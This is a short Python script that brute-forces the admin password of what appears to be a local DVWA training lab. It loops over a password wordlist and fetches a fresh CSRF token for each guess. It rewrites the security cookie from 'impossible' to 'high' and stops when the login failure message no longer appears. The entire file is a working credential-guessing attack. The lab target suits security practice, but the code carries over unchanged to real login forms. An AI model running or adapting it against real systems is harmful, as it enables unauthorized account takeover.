from login import *

url = "http://localhost:4280/vulnerabilities/brute/"

initial_login()

pswd = open("pass.txt", "r").read().split('\n')

for psw in pswd:
    
    brute_cre = {
        "username": "admin",
        "password": psw,
        "Login": "Login",
        "user_token": CSRF_Manage.get_token(session, url, header)
    }
    
    header["Cookie"] = header["Cookie"].replace("security=impossible", "security=high")
    
    response = session.get(url=url, headers=header, proxies=proxy, params=brute_cre, allow_redirects=False)
    
    print("[-] Tried password: " + psw)
    
    if "Username and/or password incorrect." not in response.text:
        print("[+] Right password is " + psw)
        break
    else:
        print("[+] Failed")
    